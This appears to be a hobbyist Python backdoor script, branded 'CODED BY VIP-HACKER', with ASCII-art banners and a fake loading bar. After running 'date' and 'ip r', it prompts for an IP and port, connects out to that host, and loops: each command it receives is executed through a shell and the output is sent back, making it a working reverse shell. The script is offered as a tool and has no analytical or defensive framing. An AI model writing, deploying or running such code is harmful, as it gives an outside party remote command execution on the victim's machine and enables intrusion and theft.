import socket
import subprocess
import os
import time
import sys
import random
               #LIFE IS FULL OF MYSTERIES#
os.system("clear")         
time.sleep(3)
print ("«««««««««««««««««««««LOADING....»»»»»»»»»»»»»»»»»»»»")
time.sleep(3)
os.system("clear")
time.sleep(3)

print  ("        ╭━━╮╭━━━┳━━━┳╮╭━╮╭━━━┳━━━┳━━━┳━━━╮")
print  ("        ┃╭╮┃┃╭━╮┃╭━╮┃┃┃╭╯╰╮╭╮┃╭━╮┃╭━╮┃╭━╮┃")
print  ("        ┃╰╯╰┫┃╱┃┃┃╱╰┫╰╯╯╱╱┃┃┃┃┃╱┃┃┃╱┃┃╰━╯┃")
print  ("        ┃╭━╮┃╰━╯┃┃╱╭┫╭╮┃╱╱┃┃┃┃┃╱┃┃┃╱┃┃╭╮╭╯")
print  ("        ┃╰━╯┃╭━╮┃╰━╯┃┃┃╰┳┳╯╰╯┃╰━╯┃╰━╯┃┃┃╰╮")
print  ("        ╰━━━┻╯╱╰┻━━━┻╯╰━┻┻━━━┻━━━┻━━━┻╯╰━╯")
print  ("--------------CODED BY VIP-HACKER----------------------")
time.sleep(3)                             
print   ("[                    ] 0% ")
time.sleep(2)
print   ("[=====               ] 25%")
time.sleep(2)
print   ( "[==========          ] 50%")
time.sleep(2)
print   ( "[===============     ] 75%")
time.sleep(2)
print   ( "[====================] 100%")
time.sleep(3)
os.system("date")
os.system("ip r")
print ( "»»»»»»»»»»»:WELCOME HACKER:«««««««««««")
host= input (str("ENTER YOUR IP : "))
port= int(input('ENTER YOUR PORT:'))
print ('«BACK-DOOR IS OPEN»')
connections = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connections.connect((host, port))
while True:
  command = connections.recv(1024)
  result_execute = subprocess.check_output(command, shell=True)
  connections.send(result_execute)




